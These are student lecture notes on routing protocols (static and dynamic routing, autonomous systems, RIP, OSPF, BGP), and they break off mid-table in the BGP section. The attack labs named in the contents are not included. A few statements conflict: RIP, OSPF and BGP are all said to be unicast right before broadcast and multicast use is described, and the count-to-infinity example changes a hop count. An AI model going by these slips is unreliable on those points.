# 🌐 Routing Protocols — Introduction & Categorisation

### Cybersecurity Student Notes | Networking Course — Network Layer

> **Source:** Gate Smashers — Routing Protocols and Its Categorisation
> **Exam Relevance:** GATE · UGC NET · University Exams · Interviews · CompTIA Security+ · CEH
> **Lab Environment:** Parrot OS + Metasploitable2 + Own MERN/PERN Projects

---

## 📑 Table of Contents

1. [The Network Layer — Core Function](#1-the-network-layer--core-function)
2. [Routing Tables — The Brain of a Router](#2-routing-tables--the-brain-of-a-router)
   - [2.1 What Is a Routing Table?](#21-what-is-a-routing-table)
   - [2.2 Static vs Dynamic Routing Tables](#22-static-vs-dynamic-routing-tables)
3. [Routing Protocols — What and Why](#3-routing-protocols--what-and-why)
4. [Autonomous Systems — Internet's Building Blocks](#4-autonomous-systems--internets-building-blocks)
   - [4.1 What Is an Autonomous System?](#41-what-is-an-autonomous-system)
   - [4.2 Intra-Domain vs Inter-Domain](#42-intra-domain-vs-inter-domain)
5. [Routing Protocol Categorisation](#5-routing-protocol-categorisation)
   - [5.1 Intra-Domain Protocols](#51-intra-domain-protocols)
   - [5.2 Inter-Domain Protocols](#52-inter-domain-protocols)
   - [5.3 Full Categorisation Tree](#53-full-categorisation-tree)
6. [Distance Vector Routing — Deep Dive](#6-distance-vector-routing--deep-dive)
   - [6.1 How It Works](#61-how-it-works)
   - [6.2 RIP — Routing Information Protocol](#62-rip--routing-information-protocol)
   - [6.3 Problems with Distance Vector](#63-problems-with-distance-vector)
7. [Link State Routing — Deep Dive](#7-link-state-routing--deep-dive)
   - [7.1 How It Works](#71-how-it-works)
   - [7.2 OSPF — Open Shortest Path First](#72-ospf--open-shortest-path-first)
8. [Path Vector Routing — BGP](#8-path-vector-routing--bgp)
9. [Comparison Table — All Protocols](#9-comparison-table--all-protocols)
10. [Security Analysis — Attacking Routing Protocols](#10-security-analysis--attacking-routing-protocols)
    - [10.1 Attacks on RIP](#101-attacks-on-rip)
    - [10.2 Attacks on OSPF](#102-attacks-on-ospf)
    - [10.3 Attacks on BGP](#103-attacks-on-bgp)
11. [🧪 Practical Labs](#11--practical-labs)
    - [Lab 1 — Capture Routing Protocol Traffic in Wireshark](#lab-1--capture-routing-protocol-traffic-in-wireshark)
    - [Lab 2 — Simulate RIP on GNS3 / Metasploitable2](#lab-2--simulate-rip-on-gns3--metasploitable2)
    - [Lab 3 — OSPF Neighbour Capture and Analysis](#lab-3--ospf-neighbour-capture-and-analysis)
    - [Lab 4 — BGP Hijacking Simulation with Scapy](#lab-4--bgp-hijacking-simulation-with-scapy)
    - [Lab 5 — Route Poisoning Attack on Your Own Network](#lab-5--route-poisoning-attack-on-your-own-network)
12. [Solved Examples](#12-solved-examples)
13. [Exam Cheat Sheet](#13-exam-cheat-sheet)

---

## 1. The Network Layer — Core Function

The fundamental job of the Network Layer (Layer 3) is **forwarding** — putting a packet on its correct, optimal path toward its destination.

```
What is Forwarding?
  → Receiving a packet and sending it out on the RIGHT interface/path.
  → "Right path" = OPTIMAL path (shortest, lowest cost, least delay).

Router's perspective:
  A router is connected to MULTIPLE networks simultaneously.

        ┌─────────────┐
        │    ROUTER   │
        └──┬──┬──┬──┬─┘
           │  │  │  │
          N1 N2 N3 N4    (N = Network)

  When a packet arrives:
    Step 1: Router receives the packet
    Step 2: Opens and inspects the packet header (Layer 3 processing)
    Step 3: Decides which of N1, N2, N3, N4 to send it out on
    Step 4: Forwards the packet on the chosen interface

  How does it decide where to send?
    → By consulting its ROUTING TABLE
```

```
What makes a path "optimal"?

  Metric            Meaning
  ──────────────── ─────────────────────────────────────────
  Hop Count         Fewest routers in between
  Delay             Least transmission + propagation delay
  Cost              Administratively assigned weight/cost
  Bandwidth         Maximum available throughput on the link
  Reliability       How often the link drops packets
  Load              How busy the link currently is

  Different routing protocols use different metrics.
  RIP uses hop count. OSPF uses cost (based on bandwidth).
```

---

## 2. Routing Tables — The Brain of a Router

### 2.1 What Is a Routing Table?

```
ROUTING TABLE — Definition:
  A collection of entries that describe the complete state of
  the network as known by this router.

  Each entry answers: "To reach network X, send the packet to Y via interface Z"

  Typical routing table entry fields:
  ┌──────────────┬────────────────┬────────────────┬────────────┬────────┐
  │ Destination  │ Subnet Mask    │ Next Hop       │ Interface  │ Metric │
  │ Network      │                │ (Gateway IP)   │            │ (Cost) │
  ├──────────────┼────────────────┼────────────────┼────────────┼────────┤
  │ 10.0.1.0     │ 255.255.255.0  │ 192.168.1.1    │ eth0       │ 1      │
  │ 10.0.2.0     │ 255.255.255.0  │ 192.168.2.1    │ eth1       │ 2      │
  │ 10.0.3.0     │ 255.255.255.0  │ 192.168.3.1    │ eth2       │ 3      │
  │ 0.0.0.0      │ 0.0.0.0        │ 203.0.113.1    │ eth3       │ 10     │
  └──────────────┴────────────────┴────────────────┴────────────┴────────┘
  ↑ Last entry = default route (0.0.0.0/0) — "send unknown destinations here"

  What does the routing table contain?
  → Which networks are reachable
  → Which connections are currently UP / DOWN
  → What is the cost of each path
  → The next hop to send a packet toward each destination
  → Which local interface to use
```

```
How a router USES the routing table (Longest Prefix Match):

  Packet arrives → dst IP = 10.0.1.50
  Router checks table top to bottom:
    → "10.0.1.0/24 — does 10.0.1.50 fit here?" → YES ✅
    → Forward to next hop 192.168.1.1 via eth0

  If multiple entries match (e.g. 10.0.0.0/8 AND 10.0.1.0/24 both match):
    → Router picks the LONGEST PREFIX (most specific match)
    → 10.0.1.0/24 is more specific than 10.0.0.0/8 → uses /24 entry
    → This is the "Longest Prefix Match" rule
```

---

### 2.2 Static vs Dynamic Routing Tables

```
TWO WAYS to build a routing table:

┌─────────────────────────────────────────────────────────────────────────┐
│  STATIC ROUTING                                                          │
├─────────────────────────────────────────────────────────────────────────┤
│  How:   Network administrator manually enters each route                 │
│  Who:   A human — the Network Admin                                     │
│  When:  Small, simple, unchanging networks                              │
│                                                                          │
│  Advantages:                                                             │
│    ✅ No overhead — no routing protocol traffic                          │
│    ✅ Fully predictable — admin controls every route                     │
│    ✅ More secure — no route advertisements to spoof                     │
│    ✅ Simple to understand and troubleshoot                              │
│                                                                          │
│  Disadvantages:                                                          │
│    ❌ Does NOT scale — impractical for large networks                    │
│    ❌ No automatic failover — if a link goes down, admin must fix it     │
│    ❌ Cannot adapt to real-time topology changes                         │
│    ❌ Human error in large configurations                                │
│                                                                          │
│  Real command:                                                           │
│    ip route add 10.0.2.0/24 via 192.168.1.1 dev eth0                   │
│    (Linux — add a static route manually)                                 │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│  DYNAMIC ROUTING                                                         │
├─────────────────────────────────────────────────────────────────────────┤
│  How:   Routers automatically share routing information with each other  │
│  Who:   Routing protocols (RIP, OSPF, BGP, EIGRP)                      │
│  When:  Large networks, the Internet, any network that changes          │
│                                                                          │
│  How dynamic routing works:                                              │
│    1. Routers start up with knowledge of ONLY directly connected nets   │
│    2. Routing protocol runs → routers exchange information              │
│    3. Each router builds a picture of the full network                  │
│    4. Routing table is computed and filled automatically                 │
│    5. When a link goes DOWN → protocol re-converges automatically       │
│                                                                          │
│  Advantages:                                                             │
│    ✅ Scales to any size network (the entire Internet uses it)           │
│    ✅ Automatic failover — finds alternate paths when link fails         │
│    ✅ Self-healing — adapts to topology changes without human input      │
│                                                                          │
│  Disadvantages:                                                          │
│    ❌ Routing protocol traffic consumes bandwidth                        │
│    ❌ More complex to configure and troubleshoot                         │
│    ❌ Security concerns — routing updates can be spoofed (key attack)    │
└─────────────────────────────────────────────────────────────────────────┘
```

```
When to use which:

  Static  → small office, stub network, a single ISP connection,
             security-sensitive links (no routing traffic leakage)

  Dynamic → enterprise networks, ISP backbones, the Internet,
             any multi-path network that needs auto failover
```

---

## 3. Routing Protocols — What and Why

```
ROUTING PROTOCOL — Definition:
  A set of rules and instructions that allows routers to:
    1. Discover neighbouring routers
    2. Share routing information with each other
    3. Automatically update routing tables when topology changes
    4. Compute optimal paths to all known destinations

  Think of it as the "language" routers speak to each other.

  Without routing protocols:
    → The entire Internet would require millions of manual static routes
    → A single link failure anywhere would require a human to fix it
    → This is obviously impossible at Internet scale

  With routing protocols:
    → Routers automatically discover the network topology
    → When a link fails → protocol re-converges → finds alternate path
    → New routers added to the network → automatically discovered
    → Everything happens without human intervention
```

```
Routing Protocol general operation cycle:

  ┌────────────────────────────────────────────────────────────────┐
  │                ROUTING PROTOCOL OPERATION CYCLE                 │
  │                                                                  │
  │  Router starts up                                               │
  │       │                                                          │
  │       ↓                                                          │
  │  Discovers directly connected networks                          │
  │       │                                                          │
  │       ↓                                                          │
  │  Sends routing information to neighbours (periodic or triggered)│
  │       │                                                          │
  │       ↓                                                          │
  │  Receives routing information from neighbours                   │
  │       │                                                          │
  │       ↓                                                          │
  │  Runs routing algorithm → computes best paths                   │
  │       │                                                          │
  │       ↓                                                          │
  │  Updates routing table with computed paths                      │
  │       │                                                          │
  │       ↓                                                          │
  │  Link state changes? → repeat cycle (re-convergence)           │
  └────────────────────────────────────────────────────────────────┘
```

---

## 4. Autonomous Systems — Internet's Building Blocks

### 4.1 What Is an Autonomous System?

```
AUTONOMOUS SYSTEM (AS) — Definition:
  A collection of IP networks and routers under the control of
  a single organisation and following a single routing policy.

  Key properties:
    → Managed by ONE network administrator / organisation
    → Has its own routing policy (how to handle traffic internally)
    → Assigned a unique AS Number (ASN) — globally unique identifier
    → Examples of organisations that own an AS:
        - An Internet Service Provider (ISP)
        - A large university
        - A multinational company (Google, Facebook, etc.)
        - A government network

  The Internet = a network of Autonomous Systems connected together

  AS Number examples:
    AS15169 → Google LLC
    AS32934 → Meta Platforms (Facebook)
    AS7018  → AT&T Services (ISP)
    AS55836 → Reliance Jio Infocomm (India)
    AS24560 → Bharti Airtel (India/Bangladesh)

  Real-world analogy used in class:
    Delhi as an Autonomous System:
      → All the small networks inside Delhi (offices, universities, ISPs)
      → Managed collectively under one administrative authority
      → Delhi AS communicates with Mumbai AS (inter-domain)
      → Within Delhi: communication is intra-domain

  Visual representation:

  ┌──────────────────────────────────┐    ┌──────────────────────────────────┐
  │  Autonomous System 1 (AS1)       │    │  Autonomous System 2 (AS2)       │
  │  (e.g., Delhi / ISP-1)           │    │  (e.g., Mumbai / ISP-2)          │
  │                                  │    │                                  │
  │  [R1]──[R2]──[R3]                │◄──►│  [R5]──[R6]──[R7]                │
  │           │                      │    │           │                      │
  │          [R4]                    │    │          [R8]                    │
  │                                  │    │                                  │
  │  N1   N2   N3   N4               │    │  N5   N6   N7   N8               │
  └──────────────────────────────────┘    └──────────────────────────────────┘
          ↑ Intra-domain routing                    ↑ Intra-domain routing
                    ↑─────────────────────────────↑
                           Inter-domain routing
```

---

### 4.2 Intra-Domain vs Inter-Domain

```
INTRA-DOMAIN ROUTING:
  ─────────────────────────────────────────────────────────────────
  "Intra" = within → routing INSIDE a single autonomous system

  Purpose:
    → Allow routers WITHIN the same AS to share topology information
    → Compute optimal paths between all routers inside the AS
    → React quickly to link failures within the AS

  What gets shared:
    → Which links are UP / DOWN
    → Link costs (delay, bandwidth, admin cost)
    → List of directly connected networks
    → Optimal paths to every subnet inside the AS

  Example from class:
    "Routing from Hauz Khas to Green Park" — both in Delhi's AS
    These are subnets within the same autonomous system
    An intra-domain protocol handles this entirely

  Protocols used:
    → RIP  (Routing Information Protocol)  — Distance Vector
    → OSPF (Open Shortest Path First)      — Link State
    → EIGRP (Cisco proprietary)            — Hybrid (Distance Vector + Link State)
    → IS-IS (Intermediate System)          — Link State (used by ISPs)

  Also called: IGP — Interior Gateway Protocol

  Speed of convergence matters most here:
    If a link fails: RIP might take minutes to re-converge
                     OSPF typically re-converges in seconds


INTER-DOMAIN ROUTING:
  ─────────────────────────────────────────────────────────────────
  "Inter" = between → routing BETWEEN autonomous systems

  Purpose:
    → Allow routers at the border of different ASes to exchange
      reachability information
    → Tell other ASes: "I can reach networks X, Y, Z. Come through me."
    → Implement routing POLICIES (business rules: who to route to, at what cost)

  What gets shared:
    → Which IP prefixes are reachable via this AS
    → The PATH of AS numbers to reach those prefixes (AS path)
    → Policy attributes (local preference, MED, communities)

  Policy examples in inter-domain routing:
    → "I will route traffic to customer networks but NOT competitor networks"
    → "I prefer this path to Tata Communications over Airtel for backup"
    → "Do not announce my internal subnets to the public Internet"

  Protocol used:
    → BGP (Border Gateway Protocol) — Path Vector

  Also called: EGP — Exterior Gateway Protocol

  BGP is THE protocol of the Internet.
  The entire Internet's routing table is BGP.
  As of 2024: the global BGP routing table has ~1 million IPv4 prefixes.
```

---

## 5. Routing Protocol Categorisation

### 5.1 Intra-Domain Protocols

```
TWO TYPES OF INTRA-DOMAIN ROUTING:

┌──────────────────────────────────────────────────────────────────────────────┐
│  1. DISTANCE VECTOR ROUTING                                                   │
│  ──────────────────────────────────────────────────────────────────────────  │
│  Core idea:                                                                    │
│    Each router tells its NEIGHBOURS about the distances it knows              │
│    "I can reach network X in 3 hops, network Y in 2 hops..."                │
│    Neighbours update their tables based on what they hear                    │
│                                                                               │
│  What gets shared:       Distance (metric) + Direction (next hop)            │
│  Algorithm:              Bellman-Ford                                         │
│  Protocol:               RIP (Routing Information Protocol)                   │
│  Updates:                Sent to directly connected neighbours only           │
│  Update trigger:         Periodic (every 30 seconds in RIPv1)                │
│  Convergence:            Slow (minutes in large networks)                     │
│                                                                               │
│  Analogy:                                                                     │
│    Like asking a friend for directions:                                       │
│    "To get to City X, go 3 roads north from me"                             │
│    You trust what they say without seeing the whole map yourself             │
│                                                                               │
│  Key weakness:           "Count to Infinity" problem (routing loops)         │
└──────────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────────┐
│  2. LINK STATE ROUTING                                                        │
│  ──────────────────────────────────────────────────────────────────────────  │
│  Core idea:                                                                    │
│    Each router FLOODS the entire network with its local link information     │
│    "Here is my complete list of links and their costs"                       │
│    Every router builds an identical map of the FULL network                  │
│    Each router INDEPENDENTLY runs Dijkstra's algorithm to find best paths    │
│                                                                               │
│  What gets shared:       Complete link state (all links + all costs)         │
│  Algorithm:              Dijkstra's Shortest Path First (SPF)                │
│  Protocol:               OSPF (Open Shortest Path First)                     │
│  Updates:                Flooded to ALL routers in the AS (not just neighbours)│
│  Update trigger:         On topology change (triggered) + periodic refresh   │
│  Convergence:            Fast (seconds)                                       │
│                                                                               │
│  Analogy:                                                                     │
│    Like having a complete GPS map of the entire city                         │
│    You know EVERY road and EVERY condition                                   │
│    You compute the best route yourself from the complete picture             │
│                                                                               │
│  Key advantage:          No routing loops (each router has the same full map)│
│  Key cost:               High memory and CPU (each router stores full topology)│
└──────────────────────────────────────────────────────────────────────────────┘
```

---

### 5.2 Inter-Domain Protocols

```
PATH VECTOR ROUTING:
  ─────────────────────────────────────────────────────────────────────────
  Core idea:
    An extension of Distance Vector, but instead of just sharing distance,
    each router shares the ENTIRE PATH (sequence of ASes) to reach a destination.

  What gets shared:
    → Destination prefix (IP network)
    → AS PATH (the sequence of AS numbers the route has passed through)
    → Other policy attributes (next-hop, MED, communities, local preference)

  Why AS PATH?
    → Prevents routing LOOPS (if your own AS is in the path — reject it)
    → Enables POLICY decisions (prefer shorter AS paths, avoid certain ASes)

  Protocol:
    → BGP (Border Gateway Protocol) — currently BGP version 4 (RFC 4271)
    → Runs over TCP port 179 (reliable transport — no UDP)
    → Peers are manually configured (not auto-discovered like OSPF/RIP)

  Example BGP UPDATE message contains:
    NLRI:     203.0.113.0/24  (network being announced)
    AS PATH:  65001 → 65002 → 65003  (the AS numbers traversed to reach it)
    NEXT HOP: 198.51.100.1  (where to forward packets entering this path)

  BGP is called "Path Vector" because:
    Distance Vector: "I can reach X at distance 3"
    Path Vector:     "I can reach X via AS65001 → AS65002 → AS65003"
    The PATH itself is the information shared — not just the distance.
```

---

### 5.3 Full Categorisation Tree

```
ROUTING PROTOCOLS — COMPLETE CATEGORISATION TREE

  Routing Protocols
  │
  ├── INTRA-DOMAIN (IGP — Interior Gateway Protocols)
  │   │
  │   ├── Distance Vector
  │   │       Algorithm:   Bellman-Ford
  │   │       Shares:      Distance (metric) to destinations
  │   │       Sends to:    Directly connected neighbours only
  │   │       ├── RIP v1   (classful, broadcast updates, max 15 hops)
  │   │       └── RIP v2   (classless CIDR, multicast 224.0.0.9, MD5 auth)
  │   │
  │   ├── Link State
  │   │       Algorithm:   Dijkstra's SPF (Shortest Path First)
  │   │       Shares:      Complete link state database (full topology)
  │   │       Sends to:    ALL routers in the AS (flooding)
  │   │       ├── OSPF     (Open Shortest Path First — most common in enterprises)
  │   │       └── IS-IS    (Intermediate System to Intermediate System — ISP backbone)
  │   │
  │   └── Hybrid (Distance Vector + Link State features)
  │           └── EIGRP (Enhanced IGRP — Cisco proprietary, uses DUAL algorithm)
  │
  └── INTER-DOMAIN (EGP — Exterior Gateway Protocols)
      │
      └── Path Vector
              Algorithm:   Policy-based best path selection
              Shares:      AS PATH + policy attributes + prefix reachability
              Sends to:    Configured BGP peers only (not auto-discovered)
              └── BGP v4   (Border Gateway Protocol — THE Internet routing protocol)


All three main protocols (RIP, OSPF, BGP) operate under UNICASTING.

  Unicast  → one sender to ONE specific receiver  (RIP, OSPF, BGP)
  Multicast → one sender to a GROUP of receivers  (separate multicast protocols)
  Broadcast → one sender to ALL on a segment      (RIPv1 updates — legacy)

  RIPv1 uses broadcast (255.255.255.255) → creates unnecessary traffic for non-routers
  RIPv2 uses multicast (224.0.0.9)       → only RIP-capable routers receive updates
  OSPF  uses multicast (224.0.0.5/6)     → only OSPF routers receive LSAs
  BGP   uses unicast TCP sessions         → only configured peers communicate
```

---

## 6. Distance Vector Routing — Deep Dive

### 6.1 How It Works

```
DISTANCE VECTOR — Step-by-Step Operation:

SETUP:
  Routers A, B, C, D all interconnected.
  Each router starts knowing ONLY its own directly connected networks.

STEP 1 — Initial table (only knows direct links):

  Router A's initial table:
  ┌──────────────┬────────┬──────────┐
  │ Destination  │ Metric │ Next Hop │
  ├──────────────┼────────┼──────────┤
  │ Net-A1       │ 0      │ direct   │
  │ Net-A2       │ 0      │ direct   │
  └──────────────┴────────┴──────────┘
  (Knows nothing about Net-B1, Net-C1, Net-D1 yet)

STEP 2 — Exchange with neighbours (first round):
  Router A sends its table to B and C (its direct neighbours).
  Router B sends its table to A and D.
  ...each router sends its current known distances.

STEP 3 — Bellman-Ford calculation:
  If Router A learns from Router B that B can reach Net-B1 at cost 1:
    A calculates: cost_A_to_B (link cost) + cost_B_to_Net-B1 (1)
    = total cost from A to Net-B1 via B
  If this is better than what A currently knows: UPDATE the table.

  Bellman-Ford equation:
    D(x, y) = min over all neighbours v [ c(x, v) + D(v, y) ]
    (Distance from x to y = minimum of: cost to reach neighbour v + v's known distance to y)

STEP 4 — Converge (repeat exchange until no more changes):
  After enough rounds: all routers know optimal paths to ALL destinations.
  Network is now "converged."

STEP 5 — Periodic updates:
  Even when nothing changes, RIP sends full routing table every 30 seconds.
  This is bandwidth-wasteful — OSPF improves on this with triggered updates.
```

```
DISTANCE VECTOR — Visual Example:

  Network topology:

        A ──(1)── B ──(3)── C
        │                   │
       (2)                 (1)
        │                   │
        D ──────(4)──────── E

  After convergence, Router A's table:
  ┌──────────────┬────────┬──────────┐
  │ Destination  │ Metric │ Next Hop │
  ├──────────────┼────────┼──────────┤
  │ A (self)     │ 0      │ –        │
  │ B            │ 1      │ B        │
  │ C            │ 4      │ B        │  (A→B→C = 1+3=4)
  │ D            │ 2      │ D        │
  │ E            │ 5      │ D        │  (A→D→E = 2+4=6 vs A→B→C→E=4+1=5 → choose 5)
  └──────────────┴────────┴──────────┘
```

---

### 6.2 RIP — Routing Information Protocol

```
RIP — Routing Information Protocol

  RFC:           RIPv1: RFC 1058 | RIPv2: RFC 2453
  Metric:        Hop count (number of routers traversed)
  Maximum hops:  15  (16 = infinity / unreachable)
                 This limits RIP to small networks (<16 hops diameter)
  Update timer:  Every 30 seconds (full table to neighbours)
  Port:          UDP 520
  Algorithm:     Bellman-Ford (distributed)

  RIPv1 vs RIPv2:
  ┌──────────────────────┬─────────────────────────┬──────────────────────────┐
  │ Feature              │ RIPv1                   │ RIPv2                    │
  ├──────────────────────┼─────────────────────────┼──────────────────────────┤
  │ IP version support   │ IPv4 only               │ IPv4 (RIPng = IPv6)      │
  │ Classful/Classless   │ Classful only           │ Classless (CIDR) ✅      │
  │ Subnet mask in ads   │ No (classful assumed)   │ Yes ✅                   │
  │ Update destination   │ Broadcast (255.255.255.255) │ Multicast 224.0.0.9 ✅│
  │ Authentication       │ None ❌ (vulnerable!)   │ MD5 optional ✅          │
  │ Next-hop field       │ No                      │ Yes ✅                   │
  └──────────────────────┴─────────────────────────┴──────────────────────────┘

  RIP Timers:
  ┌─────────────────────┬───────────┬──────────────────────────────────────────┐
  │ Timer               │ Duration  │ Purpose                                   │
  ├─────────────────────┼───────────┼──────────────────────────────────────────┤
  │ Update              │ 30 sec    │ How often to send full routing table      │
  │ Invalid (Expiry)    │ 180 sec   │ If no update for route: mark as invalid   │
  │ Flush               │ 240 sec   │ Remove route from table entirely          │
  │ Holddown            │ 180 sec   │ Don't accept new info about a bad route   │
  └─────────────────────┴───────────┴──────────────────────────────────────────┘

  RIP message format:
  ┌────────────────────────────────────────────────────────────────────────┐
  │  Command (1 byte) │ Version (1 byte) │ Must Be Zero (2 bytes)          │
  ├────────────────────────────────────────────────────────────────────────┤
  │  Address Family ID (2 bytes) │ Route Tag (2 bytes)                     │
  ├────────────────────────────────────────────────────────────────────────┤
  │  IP Address (4 bytes)                                                  │
  ├────────────────────────────────────────────────────────────────────────┤
  │  Subnet Mask (4 bytes — RIPv2 only)                                    │
  ├────────────────────────────────────────────────────────────────────────┤
  │  Next Hop (4 bytes — RIPv2 only)                                       │
  ├────────────────────────────────────────────────────────────────────────┤
  │  Metric (4 bytes — hop count, 1 to 16)                                 │
  └────────────────────────────────────────────────────────────────────────┘
  Command: 1 = Request, 2 = Response (actual routing update)
  One RIP message can carry up to 25 route entries
```

---

### 6.3 Problems with Distance Vector

```
PROBLEM 1: COUNT TO INFINITY / ROUTING LOOPS

  Scenario:
    A ──(1)── B ──(1)── C

    A knows: C is 2 hops away (via B)
    B knows: C is 1 hop away (direct)

  A link fails: B-C link goes DOWN

  What SHOULD happen:
    B should mark C as unreachable
    B should tell A: C is unreachable

  What ACTUALLY happens (slow convergence / routing loop):
    B updates: "C is unreachable (16 hops = infinity)"
    B sends update to A

    BUT — before B's update reaches A:
    B receives A's stale update: "I (A) can reach C in 3 hops!"
    B thinks: "Great! I can reach C via A in 3+1=4 hops!"
    B tells A: "C is 4 hops via me"
    A thinks: "C is 4+1=5 hops via B"
    B thinks: "C is 5+1=6 hops via A"
    ... continues counting up to 16 (infinity) — ROUTING LOOP

  Solutions implemented in RIP:
  ┌────────────────────────┬────────────────────────────────────────────────┐
  │ Solution               │ How it works                                   │
  ├────────────────────────┼────────────────────────────────────────────────┤
  │ Split Horizon          │ Don't advertise a route back to the interface  │
  │                        │ from which it was learned                      │
  ├────────────────────────┼────────────────────────────────────────────────┤
  │ Poison Reverse         │ Advertise failed route back with metric=16     │
  │                        │ (explicitly marks it as unreachable)           │
  ├────────────────────────┼────────────────────────────────────────────────┤
  │ Holddown Timers        │ Don't accept new info about a failed route     │
  │                        │ for a period — prevents stale updates          │
  ├────────────────────────┼────────────────────────────────────────────────┤
  │ Triggered Updates      │ Send updates IMMEDIATELY when topology changes │
  │                        │ (don't wait for the 30-second timer)           │
  └────────────────────────┴────────────────────────────────────────────────┘

PROBLEM 2: SLOW CONVERGENCE
  With 30-second update intervals + holddown timers:
  A route failure can take 3-6 minutes to propagate fully.
  In a large network: traffic can be blackholed for minutes.

PROBLEM 3: HOP COUNT LIMIT
  RIP's maximum of 15 hops limits network diameter.
  The Internet spans far more than 15 routers.
  This is why RIP is only used in small/medium enterprise networks.

PROBLEM 4: NO AUTHENTICATION (RIPv1)
  RIPv1 has zero authentication.
  Any device can send fake RIP updates to any router.
  An attacker can redirect traffic to a rogue path (route injection attack).
  RIPv2 adds optional MD5 authentication — but it is optional and often skipped.
```

---

## 7. Link State Routing — Deep Dive

### 7.1 How It Works

```
LINK STATE ROUTING — Step-by-Step Operation:

The fundamental difference from Distance Vector:
  Distance Vector: Share your ROUTING TABLE with neighbours
  Link State:      Share your LOCAL LINK INFO with the ENTIRE network

STEP 1 — Discover neighbours:
  Each router sends HELLO packets out all interfaces.
  Neighbour routers respond with HELLO.
  Result: each router learns WHO its direct neighbours are.

STEP 2 — Measure link costs:
  Each router measures cost of each of its directly connected links.
  Cost is typically based on: 10^8 / bandwidth (OSPF default)
  Example: 1 Gbps link → cost = 10^8 / 10^9 = 0.1 → rounded to 1

STEP 3 — Build a Link State Advertisement (LSA):
  Each router creates an LSA packet describing its local links:
  "I am Router-A. My links are:
     → B at cost 5
     → C at cost 10
     → D at cost 2"

STEP 4 — FLOOD the LSA to the ENTIRE network:
  The LSA is flooded out ALL interfaces to ALL routers.
  Each router forwards the LSA it receives (except back where it came from).
  Eventually EVERY router has EVERY other router's LSA.

STEP 5 — Build the Link State Database (LSDB):
  Each router stores ALL received LSAs in a Link State Database.
  The LSDB is a complete map of the ENTIRE network topology.
  EVERY router has an IDENTICAL LSDB (synchronised).

STEP 6 — Run Dijkstra's SPF Algorithm:
  Each router independently runs Dijkstra's algorithm on the LSDB.
  Computes shortest paths from itself to every other network.
  Builds its routing table from the computed paths.
  Since every router has the same LSDB: they all compute consistent paths.

STEP 7 — Triggered updates on topology change:
  If a link goes down: that router floods a NEW LSA with the change.
  All routers update their LSDB and re-run Dijkstra.
  Convergence is FAST (seconds) — triggered, not periodic.
```

```
LINK STATE vs DISTANCE VECTOR — Information Flow:

  DISTANCE VECTOR:
    Router A only knows:
      "B told me X is 3 hops away"
      "C told me Y is 2 hops away"
    A does NOT know the actual topology — only what its neighbours report.

  LINK STATE:
    Router A knows:
      "A-B cost 5, B-C cost 3, B-D cost 2, C-E cost 1..."
      The COMPLETE network graph.
    A computes its own paths — doesn't trust pre-computed info from others.

  This is why Link State has NO routing loops:
    Every router computes paths independently from the same full topology.
    There's no "telephone game" where bad info propagates hop by hop.
```

---

### 7.2 OSPF — Open Shortest Path First

```
OSPF — Open Shortest Path First

  RFC:           OSPFv2 (IPv4): RFC 2328 | OSPFv3 (IPv6): RFC 5340
  Algorithm:     Dijkstra's SPF
  Metric:        Cost (default: 10^8 / interface bandwidth in bps)
  Protocol:      IP Protocol 89 (NOT TCP or UDP — runs directly on IP)
  Multicast:     224.0.0.5 (ALLSPFRouters) / 224.0.0.6 (ALLDRouters)
  Authentication: MD5 (OSPFv2) / IPsec (OSPFv3)

  OSPF AREAS — Hierarchical Design:
  ─────────────────────────────────────────────────────────────────────
  Large networks with thousands of routers cannot all share LSAs together.
  Solution: divide the AS into AREAS.

  Backbone area (Area 0):
    → The central area all other areas must connect to
    → All inter-area traffic flows through Area 0

  Regular areas (Area 1, 2, 3...):
    → Connect to Area 0 via Area Border Routers (ABRs)
    → LSA flooding is contained within each area
    → Reduces memory and CPU usage

  ┌─────────────────────────────────────────────────────────────────┐
  │                     AREA 0 (BACKBONE)                            │
  │   [ABR-1] ──────────────── [ABR-2] ──────────────── [ABR-3]    │
  └──────┬──────────────────────────────────────────────────┬───────┘
         │ Area 1                                            │ Area 2
  ┌──────┴──────────────────┐              ┌────────────────┴────────┐
  │  [R1]──[R2]──[R3]       │              │  [R5]──[R6]──[R7]      │
  │  Subnet 10.1.0.0/16     │              │  Subnet 10.2.0.0/16    │
  └─────────────────────────┘              └─────────────────────────┘

  OSPF Router Types:
  ┌────────────────────────┬────────────────────────────────────────────┐
  │ Router Type            │ Role                                        │
  ├────────────────────────┼────────────────────────────────────────────┤
  │ Internal Router (IR)   │ All interfaces in one area                 │
  │ Area Border Router     │ Connects two or more areas (including 0)   │
  │   (ABR)                │ Has interface in each connected area        │
  │ Backbone Router        │ Has at least one interface in Area 0        │
  │ AS Boundary Router     │ Connects OSPF AS to external routing domain │
  │   (ASBR)               │ (redistributes routes from BGP/RIP into OSPF)│
  └────────────────────────┴────────────────────────────────────────────┘

  OSPF Packet Types:
  ┌─────────────────────┬────────┬────────────────────────────────────────┐
  │ Packet Type         │ Number │ Purpose                                 │
  ├─────────────────────┼────────┼────────────────────────────────────────┤
  │ Hello               │ 1      │ Discover/maintain neighbours            │
  │ Database Description│ 2      │ Summary of LSDB (used for initial sync) │
  │ Link State Request  │ 3      │ Request specific LSAs from neighbour    │
  │ Link State Update   │ 4      │ Send full LSA (flooding)                │
  │ Link State Ack      │ 5      │ Acknowledge received LSA                │
  └─────────────────────┴────────┴────────────────────────────────────────┘

  OSPF Neighbour States (FSM):
    Down → Init → 2-Way → ExStart → Exchange → Loading → Full
    "Full" state = adjacency established = routers share same LSDB = WORKING ✅

  DR and BDR — Designated Router and Backup DR:
    On multi-access networks (Ethernet with many routers):
    → All routers elect ONE DR and ONE BDR
    → LSA flooding goes through DR only (reduces flooding overhead)
    → If DR fails: BDR immediately takes over
    → All other routers are "DROther" — form Full adjacency only with DR/BDR
```

---

## 8. Path Vector Routing — BGP

```
BGP — Border Gateway Protocol

  RFC:           BGP-4: RFC 4271
  Algorithm:     Policy-based best path selection (not a pure metric algorithm)
  Transport:     TCP port 179 (reliable, connection-oriented)
  Update type:   Incremental (only changes — not full table every time)
  Convergence:   Slow (intentional — stability over speed at Internet scale)
  Session types:
    iBGP = internal BGP (between routers in the SAME AS)
    eBGP = external BGP (between routers in DIFFERENT ASes)

  BGP ATTRIBUTES used in path selection (in decision order):
  ┌────┬──────────────────────┬──────────────────────────────────────────────┐
  │ #  │ Attribute            │ Meaning                                       │
  ├────┼──────────────────────┼──────────────────────────────────────────────┤
  │ 1  │ Weight               │ Cisco-specific; higher = preferred; local only│
